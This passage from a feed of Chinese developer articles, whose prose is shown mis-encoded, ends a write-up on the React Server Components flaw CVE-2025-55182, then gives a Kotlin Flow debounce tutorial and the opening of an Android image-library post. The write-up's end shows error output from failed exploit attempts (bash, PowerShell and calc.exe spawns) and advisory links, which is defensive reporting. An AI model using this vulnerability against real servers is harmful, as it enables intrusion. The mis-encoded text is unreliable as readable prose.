<li>æ— æ³•æ‰§è¡Œä¸‹è½½çš„äºŒè¿›åˆ¶æ–‡ä»¶</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">/bin/sh: bash: not found
/bin/sh: powershell: not found
spawn calc.exe ENOENT
</code></pre>
<p>å®¹å™¨æ˜¯æœ€å°åŒ–é•œåƒï¼Œä¸åŒ…å« bashï¼Œè¿™å¯¼è‡´è®¸å¤šæ”»å‡»è„šæœ¬æ— æ³•æ‰§è¡Œã€‚</p>
<h2 data-id="heading-16">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React Blog - Critical Security Vulnerability</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flachlan2k" target="_blank" title="https://github.com/lachlan2k" ref="nofollow noopener noreferrer">Lachlan Davidson's Blog</a>ï¼ˆå‘ç°è€…ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cve.org%2FCVERecord%3Fid%3DCVE-2025-55182" target="_blank" title="https://www.cve.org/CVERecord?id=CVE-2025-55182" ref="nofollow noopener noreferrer">CVE-2025-55182 è¯¦æƒ…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fblog%2FCVE-2025-66478" target="_blank" title="https://nextjs.org/blog/CVE-2025-66478" ref="nofollow noopener noreferrer">Next.js Security Advisory</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fexpo.dev%2Fchangelog%2Fmitigating-critical-security-vulnerability-in-react-server-components" target="_blank" title="https://expo.dev/changelog/mitigating-critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">Expo Security Advisory</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwakujs%2Fwaku%2Fdiscussions%2F1823" target="_blank" title="https://github.com/wakujs/waku/discussions/1823" ref="nofollow noopener noreferrer">Waku Discussion</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin Flow é˜²æŠ–(Debounce)è¯¦è§£]]></title>    <link>https://juejin.cn/post/7580735683940663330</link>    <guid>https://juejin.cn/post/7580735683940663330</guid>    <pubDate>2025-12-08T02:42:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580735683940663330" data-draft-id="7580809247735873576" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin Flow é˜²æŠ–(Debounce)è¯¦è§£"/> <meta itemprop="keywords" content="Android,Kotlin,Android Jetpack"/> <meta itemprop="datePublished" content="2025-12-08T02:42:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QING618"/> <meta itemprop="url" content="https://juejin.cn/user/339115460529117"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin Flow é˜²æŠ–(Debounce)è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/339115460529117/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QING618
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:42:01.000Z" title="Mon Dec 08 2025 02:42:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Kotlin ä¸­ï¼Œ<strong>Flow é˜²æŠ–</strong>ï¼ˆDebounceï¼‰ä¸»è¦ç”¨äºå¤„ç†è¿ç»­äº‹ä»¶æµï¼Œé˜²æ­¢åœ¨çŸ­æ—¶é—´å†…é¢‘ç¹è§¦å‘æ“ä½œã€‚è¿™åœ¨ç”¨æˆ·è¾“å…¥ã€æœç´¢å»ºè®®ã€æŒ‰é’®ç‚¹å‡»ç­‰åœºæ™¯ä¸­éå¸¸æœ‰ç”¨ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€é˜²æŠ–çš„åŸºæœ¬æ¦‚å¿µ</h2>
<p><strong>é˜²æŠ–</strong>çš„æ ¸å¿ƒæ€æƒ³ï¼šåœ¨äº‹ä»¶è§¦å‘åï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå¦‚æœåœ¨è¿™æ®µæ—¶é—´å†…æ²¡æœ‰æ–°çš„äº‹ä»¶è§¦å‘ï¼Œæ‰æ‰§è¡Œæ“ä½œï¼›å¦‚æœæœ‰æ–°äº‹ä»¶ï¼Œåˆ™é‡æ–°è®¡æ—¶ã€‚</p>
<h2 data-id="heading-1">äºŒã€Kotlin Flow ä¸­çš„é˜²æŠ–æ“ä½œç¬¦</h2>
<h4 data-id="heading-2">1.Â <code>debounce()</code>Â æ“ä½œç¬¦</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">debounce</span><span class="hljs-params">(timeoutMillis: <span class="hljs-type">Long</span>)</span></span>: Flow&lt;T&gt;
</code></pre>
<h4 data-id="heading-3">2. åŸºæœ¬ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ¨¡æ‹Ÿç”¨æˆ·è¾“å…¥</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">simulateUserInput</span><span class="hljs-params">()</span></span>: Flow&lt;String&gt; = flow {
    emit(<span class="hljs-string">"A"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"AB"</span>)
    delay(<span class="hljs-number">200</span>)
    emit(<span class="hljs-string">"ABC"</span>)
    delay(<span class="hljs-number">300</span>)
    emit(<span class="hljs-string">"ABCD"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    simulateUserInput()
        .debounce(<span class="hljs-number">250</span>) <span class="hljs-comment">// 250ms é˜²æŠ–æ—¶é—´</span>
        .collect { value -&gt;
            println(<span class="hljs-string">"Debounced: <span class="hljs-variable">$value</span> at <span class="hljs-subst">${System.currentTimeMillis()}</span>"</span>)
        }
}
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€å®é™…åº”ç”¨åœºæ™¯</h2>
<h4 data-id="heading-5">1. æœç´¢æ¡†é˜²æŠ–</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchViewModel</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _searchQuery = MutableStateFlow(<span class="hljs-string">""</span>)
    <span class="hljs-keyword">val</span> searchResults: Flow&lt;List&lt;String&gt;&gt;
    
    <span class="hljs-keyword">init</span> {
        searchResults = _searchQuery
            .debounce(<span class="hljs-number">300</span>) <span class="hljs-comment">// 300ms é˜²æŠ–</span>
            .filter { it.length &gt;= <span class="hljs-number">2</span> } <span class="hljs-comment">// è‡³å°‘2ä¸ªå­—ç¬¦æ‰æœç´¢</span>
            .distinctUntilChanged() <span class="hljs-comment">// å€¼å˜åŒ–æ—¶æ‰è§¦å‘</span>
            .flatMapLatest { query -&gt;
                performSearch(query)
            }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onQueryChanged</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span> {
        _searchQuery.value = query
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">performSearch</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span>: Flow&lt;List&lt;String&gt;&gt; = flow {
        <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
        delay(<span class="hljs-number">500</span>)
        emit(listOf(<span class="hljs-string">"result1"</span>, <span class="hljs-string">"result2"</span>))
    }
}
</code></pre>
<h4 data-id="heading-6">2. æŒ‰é’®ç‚¹å‡»é˜²æŠ–</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ButtonDebounceExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _buttonClicks = MutableSharedFlow&lt;<span class="hljs-built_in">Unit</span>&gt;()
    
    <span class="hljs-keyword">val</span> debouncedClicks = _buttonClicks
        .debounce(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 1ç§’å†…åªå…è®¸ä¸€æ¬¡ç‚¹å‡»</span>
        .onEach {
            performAction()
        }
    
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onClick</span><span class="hljs-params">()</span></span> {
        _buttonClicks.emit(<span class="hljs-built_in">Unit</span>)
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">performAction</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"Button clicked at <span class="hljs-subst">${System.currentTimeMillis()}</span>"</span>)
    }
}
</code></pre>
<h2 data-id="heading-7">å››ã€é˜²æŠ–ä¸å…¶ä»–æ“ä½œç¬¦çš„ç»“åˆä½¿ç”¨</h2>
<h4 data-id="heading-8">1. ç»“åˆÂ <code>filter()</code>Â å’ŒÂ <code>distinctUntilChanged()</code></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> searchFlow = userInputFlow
    .filter { it.isNotBlank() }
    .debounce(<span class="hljs-number">300</span>)
    .distinctUntilChanged() <span class="hljs-comment">// é¿å…è¿ç»­ç›¸åŒçš„å€¼</span>
    .flatMapLatest { query -&gt;
        searchApi.search(query)
    }
</code></pre>
<h4 data-id="heading-9">2. ç»“åˆÂ <code>onEach()</code>Â è¿›è¡Œè°ƒè¯•</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
    .onEach { println(<span class="hljs-string">"åŸå§‹å€¼: <span class="hljs-variable">$it</span>"</span>) }
    .debounce(<span class="hljs-number">100</span>)
    .onEach { println(<span class="hljs-string">"é˜²æŠ–å: <span class="hljs-variable">$it</span>"</span>) }
    .collect()
</code></pre>
<h2 data-id="heading-10">äº”ã€é˜²æŠ–ä¸èŠ‚æµï¼ˆThrottleï¼‰çš„åŒºåˆ«</h2>

























<table><thead><tr><th>ç‰¹æ€§</th><th>é˜²æŠ– (Debounce)</th><th>èŠ‚æµ (Throttle)</th></tr></thead><tbody><tr><td>ç›®çš„</td><td>ç­‰å¾…ç¨³å®šåæ‰§è¡Œ</td><td>å›ºå®šé¢‘ç‡æ‰§è¡Œ</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>æœç´¢è¾“å…¥ã€çª—å£è°ƒæ•´</td><td>æ»šåŠ¨äº‹ä»¶ã€æ¸¸æˆå¾ªç¯</td></tr><tr><td>Flow æ“ä½œç¬¦</td><td><code>debounce()</code></td><td><code>sample()</code>Â æˆ–è‡ªå®šä¹‰</td></tr></tbody></table>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// é˜²æŠ–ç¤ºä¾‹ï¼šåªåœ¨ç”¨æˆ·åœæ­¢è¾“å…¥åæ‰§è¡Œ</span>
inputFlow.debounce(<span class="hljs-number">300</span>)

<span class="hljs-comment">// èŠ‚æµç¤ºä¾‹ï¼šæ¯300msæœ€å¤šæ‰§è¡Œä¸€æ¬¡</span>
inputFlow.throttleLatest(<span class="hljs-number">300</span>)
</code></pre>
<h2 data-id="heading-11">å…­ã€è‡ªå®šä¹‰é˜²æŠ–é€»è¾‘</h2>
<p>å¦‚æœéœ€è¦æ›´å¤æ‚çš„é˜²æŠ–é€»è¾‘ï¼Œå¯ä»¥è‡ªå®šä¹‰æ“ä½œç¬¦ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">customDebounce</span><span class="hljs-params">(
    timeout: <span class="hljs-type">Long</span>,
    coroutineScope: <span class="hljs-type">CoroutineScope</span>
)</span></span>: Flow&lt;T&gt; = channelFlow {
    <span class="hljs-keyword">var</span> job: Job? = <span class="hljs-literal">null</span>
    
    collect { value -&gt;
        job?.cancel() <span class="hljs-comment">// å–æ¶ˆå‰ä¸€ä¸ªä»»åŠ¡</span>
        job = coroutineScope.launch {
            delay(timeout)
            send(value)
        }
    }
}
</code></pre>
<h2 data-id="heading-12">ä¸ƒã€æ³¨æ„äº‹é¡¹</h2>
<ol>
<li>
<p><strong>è¶…æ—¶æ—¶é—´é€‰æ‹©</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å¤ªçŸ­ï¼šå¯èƒ½è¿‡äºé¢‘ç¹</span>
.debounce(<span class="hljs-number">50</span>)

<span class="hljs-comment">// å¤ªé•¿ï¼šç”¨æˆ·ä½“éªŒå·®</span>
.debounce(<span class="hljs-number">2000</span>)

<span class="hljs-comment">// åˆé€‚ï¼šé€šå¸¸ 200-500ms</span>
.debounce(<span class="hljs-number">300</span>)
</code></pre>
</li>
<li>
<p><strong>å†·æµ vs çƒ­æµ</strong></p>
<ul>
<li><code>StateFlow</code>Â å’ŒÂ <code>SharedFlow</code>Â æ˜¯çƒ­æµï¼Œé€‚åˆé˜²æŠ–</li>
<li>æ™®é€šå†·æµæ¯æ¬¡æ”¶é›†éƒ½ä¼šé‡æ–°å¼€å§‹</li>
</ul>
</li>
<li>
<p><strong>èµ„æºç®¡ç†</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">.debounce(<span class="hljs-number">300</span>)
.onCompletion { println(<span class="hljs-string">"Flow completed"</span>) }
.<span class="hljs-keyword">catch</span> { e -&gt; println(<span class="hljs-string">"Error: <span class="hljs-variable">$e</span>"</span>) }
</code></pre>
</li>
</ol>
<h2 data-id="heading-13">å…«ã€å®Œæ•´ç¤ºä¾‹</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DebounceExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> searchQuery = MutableStateFlow(<span class="hljs-string">""</span>)
    
    <span class="hljs-keyword">val</span> searchResults = searchQuery
        .debounce(<span class="hljs-number">300</span>)
        .filter { it.length &gt;= <span class="hljs-number">3</span> }
        .distinctUntilChanged()
        .flatMapLatest { query -&gt;
            fetchSearchResults(query)
                .<span class="hljs-keyword">catch</span> { e -&gt; 
                    emit(emptyList())
                    println(<span class="hljs-string">"Search error: <span class="hljs-variable">$e</span>"</span>)
                }
        }
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(<span class="hljs-number">5000</span>),
            initialValue = emptyList()
        )
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateQuery</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span> {
        searchQuery.value = query
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchSearchResults</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span>: Flow&lt;List&lt;String&gt;&gt; = flow {
        <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
        delay(<span class="hljs-number">500</span>)
        <span class="hljs-keyword">val</span> results = listOf(<span class="hljs-string">"<span class="hljs-variable">$query</span> result1"</span>, <span class="hljs-string">"<span class="hljs-variable">$query</span> result2"</span>)
        emit(results)
    }
}
</code></pre>
<h2 data-id="heading-14">æ€»ç»“</h2>
<p>Kotlin Flow çš„Â <code>debounce()</code>Â æ“ä½œç¬¦æ˜¯å®ç°é˜²æŠ–çš„ç®€æ´æœ‰æ•ˆæ–¹å¼ã€‚åˆç†ä½¿ç”¨é˜²æŠ–å¯ä»¥ï¼š</p>
<ol>
<li>å‡å°‘ä¸å¿…è¦çš„ç½‘ç»œè¯·æ±‚</li>
<li>æå‡åº”ç”¨æ€§èƒ½</li>
<li>æ”¹å–„ç”¨æˆ·ä½“éªŒ</li>
<li>é™ä½æœåŠ¡å™¨å‹åŠ›</li>
</ol>
<p>æ ¹æ®å…·ä½“åœºæ™¯é€‰æ‹©åˆé€‚çš„é˜²æŠ–æ—¶é—´ï¼Œå¹¶ç»“åˆå…¶ä»–æ“ä½œç¬¦å¦‚Â <code>filter()</code>ã€<code>distinctUntilChanged()</code>ã€<code>flatMapLatest()</code>Â ç­‰ï¼Œå¯ä»¥æ„å»ºå‡ºé«˜æ•ˆçš„äº‹ä»¶å¤„ç†æµæ°´çº¿ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[FluxImageLoader : åŸºäºCoil3å°è£…çš„ Android å›¾ç‰‡åŠ è½½åº“ï¼Œæ—¨åœ¨æä¾›ç®€å•ã€é«˜æ•ˆä¸”åŠŸèƒ½ä¸°å¯Œçš„å›¾ç‰‡åŠ è½½è§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7581270148046356520</link>    <guid>https://juejin.cn/post/7581270148046356520</guid>    <pubDate>2025-12-08T10:33:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581270148046356520" data-draft-id="7581299982670692386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="FluxImageLoader : åŸºäºCoil3å°è£…çš„ Android å›¾ç‰‡åŠ è½½åº“ï¼Œæ—¨åœ¨æä¾›ç®€å•ã€é«˜æ•ˆä¸”åŠŸèƒ½ä¸°å¯Œçš„å›¾ç‰‡åŠ è½½è§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2025-12-08T10:33:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Nerve"/> <meta itemprop="url" content="https://juejin.cn/user/3438928101639512"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            FluxImageLoader : åŸºäºCoil3å°è£…çš„ Android å›¾ç‰‡åŠ è½½åº“ï¼Œæ—¨åœ¨æä¾›ç®€å•ã€é«˜æ•ˆä¸”åŠŸèƒ½ä¸°å¯Œçš„å›¾ç‰‡åŠ è½½è§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3438928101639512/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Nerve
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T10:33:32.000Z" title="Mon Dec 08 2025 10:33:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li 